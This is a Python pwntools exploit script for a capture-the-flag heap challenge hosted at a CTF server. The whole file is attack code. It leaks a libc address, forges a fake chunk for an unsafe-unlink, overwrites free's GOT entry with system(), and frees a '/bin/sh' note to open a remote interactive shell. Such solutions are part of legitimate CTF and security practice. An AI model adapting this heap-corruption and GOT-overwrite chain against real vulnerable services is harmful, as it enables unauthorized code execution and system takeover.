# !/usr/bin/env python
# powerprove

from pwn import *
import sys

if len(sys.argv) == 1:
	host = "localhost"
	port = 4000
else:
	host = "pwn1.chal.ctf.westerns.tokyo"
	port = 16317

def menu(index):
	s.recvuntil("Your choice: \n")
	s.sendline(str(index))

def add(size, payload):
	menu(1)
	s.recvuntil("Please input the size: \n")
	s.sendline(str(size))
	s.recvuntil("Please input your note: \n")
	s.sendline(payload)

def delete(index):
	menu(2)
	s.recvuntil("Please input the index: \n")
	s.sendline(str(index))

def show(index):
	menu(3)
	s.recvuntil("Please input the index: \n")
	s.sendline(str(index))

def edit(index, payload):
	menu(4)
	s.recvuntil("Please input the index: \n")
	s.sendline(str(index))
	s.recvuntil("Please input your note: \n")
	s.sendline(payload)

s = remote(host, port)

if __name__ == "__main__":

        add(128, "A"*127)
        add(128, "A"*127)
        add(128, "A"*127)
	add(128 + 8, "A"*135)
	add(128, "A"*127)
	add(128, "/bin/sh\x00")
	delete(4)
	add(128, "")

	show(4)
	s.recvuntil("Note: \n\n")
	libc_base = u64(str("\x00" + s.recv(5)).ljust(8, "\x00")) - 0x3c4b00
	system_addr = libc_base + 0x45390
	log.info("libc_base           : " + hex(libc_base))
	log.info("system_addr         : " + hex(system_addr))

	payload = p64(0x0)
	payload += p64(0x81)
	payload += p64(0x6020d8 - 24)
	payload += p64(0x6020d8 - 16)
	payload = payload.ljust(128, "A")
	payload += p64(0x80)
	payload += "\x90"
	edit(3, payload)
	delete(4)
	edit(3, "\x18\x20\x60\x00\x00") # free_got
	edit(0, p64(system_addr))
	delete(5)

	s.interactive()
